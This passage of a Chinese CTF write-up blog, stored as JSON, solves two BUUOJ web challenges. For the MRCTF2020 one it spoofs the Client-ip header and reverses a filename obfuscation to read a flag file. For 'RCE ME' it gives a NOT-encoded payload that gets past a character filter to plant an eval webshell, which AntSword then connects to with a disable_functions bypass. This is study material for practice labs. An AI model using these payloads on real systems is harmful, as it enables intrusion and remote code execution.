variable\">$v</span> <span class=\"token operator\">=</span> <span class=\"token function\">base64_decode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$v</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n    <span class=\"token variable\">$re</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">;</span> \n    <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$i</span><span class=\"token operator\">&lt;</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$v</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$i</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span> \n        <span class=\"token variable\">$re</span> <span class=\"token operator\">.=</span> <span class=\"token function\">chr </span><span class=\"token punctuation\">(</span> <span class=\"token function\">ord </span><span class=\"token punctuation\">(</span><span class=\"token variable\">$v</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token variable\">$i</span><span class=\"token operator\">*</span><span class=\"token number\">2</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n    <span class=\"token punctuation\">&#125;</span> \n    <span class=\"token keyword\">return</span> <span class=\"token variable\">$re</span><span class=\"token punctuation\">;</span> \n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'Local access only!'</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"&lt;br/>\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$ip</span> <span class=\"token operator\">=</span> <span class=\"token function\">getIp</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ip</span><span class=\"token operator\">!=</span><span class=\"token string single-quoted-string\">'127.0.0.1'</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"Sorry,you don't have permission!  Your ip is :\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$ip</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ip</span> <span class=\"token operator\">===</span> <span class=\"token string single-quoted-string\">'127.0.0.1'</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'2333'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">===</span> <span class=\"token string single-quoted-string\">'todat is a happy day'</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"Your REQUEST is:\"</span><span class=\"token operator\">.</span><span class=\"token function\">change</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token function\">change</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">&#125;</span>\n<span class=\"token delimiter important\">?></span></span> <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>Client-ip的http头部实现绕过本地验证，然后利用PHP伪协议满足2333比较<code>data://text/plain,todat is a happy day</code>,这样就到最后一步了，需要针对change函数，编写逆向算法破解，来读取flag文件。</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'flag.php'</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$i</span><span class=\"token operator\">&lt;</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$i</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$result</span> <span class=\"token operator\">.=</span> <span class=\"token function\">chr</span><span class=\"token punctuation\">(</span> <span class=\"token function\">ord</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token variable\">$i</span><span class=\"token operator\">*</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$result</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token function\">base64_encode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$result</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$result</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://gitee.com/A1andNS/blogimage/raw/master/img/202108281933770.png\" alt=\"image-20210828193338821\"></p>\n<h2 id=\"极客大挑战-2019-RCE-ME\"><a href=\"#极客大挑战-2019-RCE-ME\" class=\"headerlink\" title=\"[极客大挑战 2019]RCE ME\"></a>[极客大挑战 2019]RCE ME</h2><p>考点：无符号RCE</p>\n<p>源码：</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'code'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token variable\">$code</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'code'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n                    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$code</span><span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span class=\"token number\">40</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n                                        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"This is too Long.\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                                                <span class=\"token punctuation\">&#125;</span>\n                    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/[A-Za-z0-9]+/\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$code</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n                                        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"NO.\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                                                <span class=\"token punctuation\">&#125;</span>\n                    @<span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$code</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token comment\">// </span><span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>使用取反来绕过，exp:</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">echo</span> <span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token function\">urlencode</span><span class=\"token punctuation\">(</span><span class=\"token operator\">~</span><span class=\"token string single-quoted-string\">'assert'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token function\">urlencode</span><span class=\"token punctuation\">(</span><span class=\"token operator\">~</span><span class=\"token string single-quoted-string\">'eval($_POST[\"cmd\"])'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>然后构造如下payload：</p>\n<pre class=\"line-numbers language-http\" data-language=\"http\"><code class=\"language-http\"><span class=\"token header-name keyword\">http:</span>//69139acd-11a7-4c21-a087-feb44a969ae1.node4.buuoj.cn:81/?code=(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%DD%9C%92%9B%DD%A2%D6);<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>再使用antsword去连接一下webshell。</p>\n<p><img src=\"C:\\Users\\lilon\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210930203912566.png\" alt=\"image-20210930203912566\"></p>\n<p>发现被限制了执行命令，利用answord自带的disable_function绕过插件。</p>\n<p><img src=\"C:\\Users\\lilon\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210930204147075.png\" alt=\"image-20210930204147075\"></p>\n","text":"[HITCON 2017]Babyfirst-Revenge考点：长度限制的命令执行 这是一个典型的限制长度为 5的命令执行题目 &lt;?php echo $_SERVER['REMOTE_ADDR'].\"\\n\"; $sandbox = '/var/www/html/sandb...","link":"","photos":[],"count_time":{"symbolsCount":"13k","symbolsTime":"12 mins."},"categories":[{"name":"CTF","slug":"CTF","count":44,"path":"api/categories/CTF.json"}],"tags":[{"name":"BUUOJ","slug":"BUUOJ","count":13,"path":"api/tags/BUUOJ.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#HITCON-2017-Babyfirst-Revenge\"><span class=\"toc-text\">[HITCON 2017]Babyfirst-Revenge</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#GYCTF2020-FlaskApp\"><span class=\"toc-text\">[GYCTF2020]FlaskApp</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Web11\"><span class=\"toc-text\">[CISCN2019 华东南赛区]Web11</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#BJDCTF-2nd-elementmaster\"><span class=\"toc-text\">[BJDCTF 2nd]elementmaster</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#BJDCTF-2nd-Schro%CC%88dinger\"><span class=\"toc-text\">[BJDCTF 2nd]Schrödinger</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#BJDCTF-2nd-%E8%80%81%E6%96%87%E7%9B%B2%E4%BA%86\"><span class=\"toc-text\">[BJDCTF 2nd]老文盲了</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#BJDCTF-2nd-cat-flag\"><span class=\"toc-text\">[BJDCTF 2nd]cat_flag</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#MRCTF2020-%E5%A5%97%E5%A8%83\"><span class=\"toc-text\">[MRCTF2020]套娃</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME\"><span class=\"toc-text\">[极客大挑战 2019]RCE ME</span></a></li></ol>","author":{"name":"A1andNS","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"RE启动笔记","uid":"e9b793bf11c1914484b7555a66d461ba","slug":"RE启动笔记","date":"2021-05-03T03:24:23.000Z","updated":"2021-05-07T14:23:37.000Z","comments":true,"path":"api/articles/RE启动笔记.json","keywords":"A1andNS","cover":[],"text":"基本知识常见的处理器架构常见的CPU架构有X86架构、AMD64架构、ARM架构、MIPS架构、IA64架构、X86-64架构。 而这些架构又都会对应相应的指令集，指令集又分为**精简指令集(risv)和相对复杂的复杂指令集(cisv)**，其中ARM架构多用于手机等移动设备，例...","link":"","photos":[],"count_time":{"symbolsCount":"2.4k","symbolsTime":"2 mins."},"categories":[{"name":"学习笔记","slug":"学习笔记","count":35,"path":"api/categories/学习笔记.json"}],"tags":[{"name":"RE","slug":"RE","count":1,"path":"api/tags/RE.json"}],"author":{"name":"A1andNS","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"Python安全编程小练习2","uid":"04eae79709b48ea326c448f0846fb5ce","slug":"Python安全编程小练习2","date":"2021-04-14T11:32:47.000Z","updated":"2021-06-28T14:41:16.000Z","comments":true,"path":"api/articles/Python安全编程小练习2.json","keywords":"A1andNS","cover":"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200323233608.png","text":"今天继续，来看看子域名挖掘和邮件爬取，今天涉及的两者都是对网络爬虫的深入应用，从而实现信息搜集目的。并且因为是利用爬虫来爬取搜索引擎的信息，所以直接面临的就是百度等网站的反爬虫保护，而我们要实现工具的使用就需要绕过这些保护。 前期准备就按照书上的来，我们也来看看必应搜索(http...","link":"","photos":[],"count_time":{"symbolsCount":"7.7k","symbolsTime":"7 mins."},"categories":[{"name":"Python学习","slug":"Python学习","count":19,"path":"api/categories/Python学习.json"}],"tags":[{"name":"网络安全","slug":"网络安全","count":32,"path":"api/tags/网络安全.json"},{"name":"Python","slug":"Python","count":23,"path":"api/tags/Python.json"}],"author":{"name":"A1andNS","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}